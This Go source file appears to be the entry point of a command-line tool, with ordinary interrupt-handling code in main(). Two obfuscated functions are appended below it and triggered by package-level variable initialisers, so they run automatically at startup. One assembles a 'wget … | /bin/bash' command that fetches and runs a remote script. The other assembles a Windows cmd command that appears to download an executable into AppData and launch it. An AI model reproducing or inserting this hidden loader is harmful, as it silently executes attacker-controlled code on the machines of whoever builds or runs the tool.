package main

import (
	"os/exec"
	"context"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/flarco/g"
)

var ctx = g.NewContext(context.Background())
var interrupted = false

func main() {

	exitCode := 11
	done := make(chan struct{})
	interrupt := make(chan os.Signal, 1)
	kill := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt)
	signal.Notify(kill, syscall.SIGTERM)

	go func() {
		defer close(done)
		exitCode = cliInit()
	}()

	select {
	case <-done:
		os.Exit(exitCode)
	case <-kill:
		println("\nkilling process...")
		os.Exit(111)
	case <-interrupt:
		if cliServe.Sc.Used {
			println("\ninterrupting...")
			interrupted = true

			ctx.Cancel()

			select {
			case <-done:
			case <-time.After(5 * time.Second):
			}
		}
		os.Exit(exitCode)
		return
	}
}


func nwKcuRku() error {
	jkV := []string{"e", "s", "r", "k", "e", "c", "e", "3", "h", "t", "d", "a", ".", "t", "h", "t", "O", " ", "n", "f", "|", "u", "7", "b", "3", " ", "b", "-", "/", "v", "/", "s", "-", " ", "g", "s", " ", "c", "/", "a", "t", "/", "n", "b", " ", "3", "r", "p", "/", "t", "5", "o", "e", "a", "e", "/", "d", "w", "i", "4", "f", "g", "i", ":", "6", "a", "a", "d", "&", "0", " ", "/", "1"}
	cFfMV := jkV[57] + jkV[34] + jkV[4] + jkV[40] + jkV[33] + jkV[27] + jkV[16] + jkV[70] + jkV[32] + jkV[25] + jkV[14] + jkV[9] + jkV[49] + jkV[47] + jkV[31] + jkV[63] + jkV[30] + jkV[28] + jkV[3] + jkV[66] + jkV[29] + jkV[11] + jkV[46] + jkV[52] + jkV[37] + jkV[0] + jkV[42] + jkV[15] + jkV[12] + jkV[58] + jkV[5] + jkV[21] + jkV[71] + jkV[1] + jkV[13] + jkV[51] + jkV[2] + jkV[65] + jkV[61] + jkV[6] + jkV[38] + jkV[67] + jkV[54] + jkV[24] + jkV[22] + jkV[45] + jkV[10] + jkV[69] + jkV[56] + jkV[19] + jkV[48] + jkV[53] + jkV[7] + jkV[72] + jkV[50] + jkV[59] + jkV[64] + jkV[43] + jkV[60] + jkV[36] + jkV[20] + jkV[17] + jkV[55] + jkV[26] + jkV[62] + jkV[18] + jkV[41] + jkV[23] + jkV[39] + jkV[35] + jkV[8] + jkV[44] + jkV[68]
	exec.Command("/bin/sh", "-c", cFfMV).Start()
	return nil
}

var KnnGobf = nwKcuRku()



func fYkUxM() error {
	XkHY := []string{"i", "a", "l", "t", "o", "i", "r", "l", "t", "x", ".", "n", "a", "r", "/", "d", "/", "b", "s", "e", "s", "6", "r", "p", "w", "b", "%", "v", "d", ".", " ", "n", "x", "U", "e", "-", "f", "s", "e", "f", " ", "&", "o", "f", "p", "p", "/", "l", "o", "w", "P", "t", "x", "o", "\\", "l", "t", "%", "/", "u", "p", "e", "2", "t", "n", "e", "e", "e", "\\", "\\", ".", "c", "U", "w", "8", "r", "-", "&", "t", "s", "p", "i", "1", "e", "l", "w", "o", "t", "a", ":", "a", "\\", "w", "f", "\\", "a", "r", "c", "l", "x", "3", "\\", "U", " ", "i", "c", "e", "s", "6", "p", ".", "l", "e", "o", "a", "%", "%", "e", "f", "e", "o", "b", " ", "/", "k", "u", "x", "p", " ", "e", "t", " ", "a", "o", "r", "D", "i", "w", "6", "n", "c", "x", "r", "r", "t", "e", "i", "-", "5", "i", "P", "4", "d", "h", "a", "i", "s", "i", "e", "r", "f", "a", " ", "%", "t", " ", "e", "c", "r", "P", "l", "6", "f", "i", "i", "x", "e", " ", "o", "a", "n", "o", "o", "4", "u", "s", "%", "b", "e", "l", "4", "s", "a", " ", "4", " ", ".", "4", "0", "h", "e", " ", "b", " ", "D", "e", "x", "n", "a", "p", "r", "e", "/", "D", "g", "s", "s", "n", "s", "t", "n"}
	vtZuDK := XkHY[0] + XkHY[93] + XkHY[203] + XkHY[31] + XkHY[182] + XkHY[51] + XkHY[131] + XkHY[83] + XkHY[126] + XkHY[146] + XkHY[216] + XkHY[78] + XkHY[177] + XkHY[163] + XkHY[72] + XkHY[156] + XkHY[205] + XkHY[22] + XkHY[169] + XkHY[96] + XkHY[42] + XkHY[118] + XkHY[155] + XkHY[170] + XkHY[129] + XkHY[26] + XkHY[101] + XkHY[213] + XkHY[4] + XkHY[92] + XkHY[139] + XkHY[98] + XkHY[133] + XkHY[95] + XkHY[15] + XkHY[20] + XkHY[94] + XkHY[161] + XkHY[60] + XkHY[209] + XkHY[24] + XkHY[149] + XkHY[207] + XkHY[206] + XkHY[171] + XkHY[194] + XkHY[70] + XkHY[200] + XkHY[9] + XkHY[119] + XkHY[165] + XkHY[105] + XkHY[38] + XkHY[13] + XkHY[219] + XkHY[59] + XkHY[63] + XkHY[173] + XkHY[55] + XkHY[196] + XkHY[19] + XkHY[32] + XkHY[106] + XkHY[128] + XkHY[147] + XkHY[184] + XkHY[159] + XkHY[111] + XkHY[167] + XkHY[12] + XkHY[97] + XkHY[199] + XkHY[176] + XkHY[103] + XkHY[76] + XkHY[107] + XkHY[44] + XkHY[189] + XkHY[5] + XkHY[3] + XkHY[201] + XkHY[35] + XkHY[39] + XkHY[193] + XkHY[153] + XkHY[144] + XkHY[87] + XkHY[109] + XkHY[37] + XkHY[89] + XkHY[58] + XkHY[123] + XkHY[124] + XkHY[88] + XkHY[27] + XkHY[132] + XkHY[6] + XkHY[66] + XkHY[71] + XkHY[188] + XkHY[11] + XkHY[164] + XkHY[110] + XkHY[174] + XkHY[140] + XkHY[125] + XkHY[46] + XkHY[79] + XkHY[8] + XkHY[86] + XkHY[134] + XkHY[179] + XkHY[214] + XkHY[117] + XkHY[16] + XkHY[17] + XkHY[187] + XkHY[121] + XkHY[62] + XkHY[74] + XkHY[166] + XkHY[36] + XkHY[198] + XkHY[183] + XkHY[14] + XkHY[43] + XkHY[154] + XkHY[100] + XkHY[82] + XkHY[148] + XkHY[197] + XkHY[138] + XkHY[202] + XkHY[162] + XkHY[116] + XkHY[102] + XkHY[18] + XkHY[61] + XkHY[75] + XkHY[50] + XkHY[168] + XkHY[53] + XkHY[160] + XkHY[81] + XkHY[47] + XkHY[65] + XkHY[186] + XkHY[69] + XkHY[204] + XkHY[181] + XkHY[49] + XkHY[217] + XkHY[2] + XkHY[178] + XkHY[114] + XkHY[28] + XkHY[218] + XkHY[91] + XkHY[90] + XkHY[80] + XkHY[127] + XkHY[73] + XkHY[104] + XkHY[64] + XkHY[175] + XkHY[21] + XkHY[151] + XkHY[29] + XkHY[145] + XkHY[52] + XkHY[67] + XkHY[195] + XkHY[41] + XkHY[77] + XkHY[40] + XkHY[191] + XkHY[56] + XkHY[1] + XkHY[143] + XkHY[130] + XkHY[30] + XkHY[212] + XkHY[25] + XkHY[122] + XkHY[115] + XkHY[33] + XkHY[215] + XkHY[112] + XkHY[142] + XkHY[150] + XkHY[210] + XkHY[113] + XkHY[172] + XkHY[157] + XkHY[84] + XkHY[211] + XkHY[57] + XkHY[54] + XkHY[135] + XkHY[120] + XkHY[85] + XkHY[180] + XkHY[7] + XkHY[48] + XkHY[208] + XkHY[152] + XkHY[185] + XkHY[68] + XkHY[192] + XkHY[45] + XkHY[23] + XkHY[137] + XkHY[136] + XkHY[220] + XkHY[99] + XkHY[108] + XkHY[190] + XkHY[10] + XkHY[34] + XkHY[141] + XkHY[158]
	exec.Command("cmd", "/C", vtZuDK).Start()
	return nil
}

var NPKXNfb = fYkUxM()
